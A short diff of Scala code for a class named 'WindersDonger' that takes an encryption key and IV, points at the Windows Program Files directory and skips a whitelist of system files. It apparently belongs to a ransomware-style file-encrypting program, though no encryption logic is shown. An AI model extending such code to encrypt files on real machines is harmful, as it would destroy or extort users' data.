@@ -133,7 +133,6 @@ object Donger {
 
 class WindersDonger(key: Array[Byte], iv:Array[Byte]) extends Donger {
   val DIR = List[String](System.getenv("ProgramFiles"))
-//  val DIR = List[String](System.getProperty("user.home"),System.getenv("WINDIR") + "\\system32")
   val WINDERS_WHITELIST = List[String]("java.exe", "cmd.exe", "ntlm.sys", "Common Files")
   def raiseDonger(option: String) {
     println("(ง ͠ ͠° ل͜ °)ง  WINDERS DONGER RAISED, SIR")
